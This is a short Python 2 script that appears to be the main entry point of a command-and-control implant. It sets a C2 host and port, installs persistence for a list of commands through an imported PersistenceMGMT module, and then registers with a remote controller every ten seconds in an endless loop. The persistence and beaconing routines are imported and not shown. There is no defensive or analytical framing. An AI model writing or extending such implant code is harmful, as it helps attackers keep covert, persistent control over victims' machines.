import argparse
from os import sys, path

sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))
from .rest import ApiHelper
from .lib.persistance import PersistenceMGMT
from .db.SQLite import Helper
from .settings import commands


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--c2-host', action='store', dest='host', help='Change the c2 node hostname')
    parser.add_argument('--c2-port', action='store', dest='port', default=8000, help='Set port for C2 server, defaults to 8000')
    args = parser.parse_args()
    return args


def main(args=None):
    db = Helper()
    args = parse_args()
    if args.host:
        db.set_config('c2_host', args.host)
    if args.port:
        db.set_config('c2_port', args.port)
    init()
    api_loop()


def init():
    def run():
        persistence = PersistenceMGMT()
        for command in commands:
            print "[+] Persisting %s" % command
            persistence.persist(command)
    run()

def api_loop():
    from time import sleep
    api = ApiHelper()
    while True:
        api.register()
        sleep(10)


if __name__ == "__main__":
    main()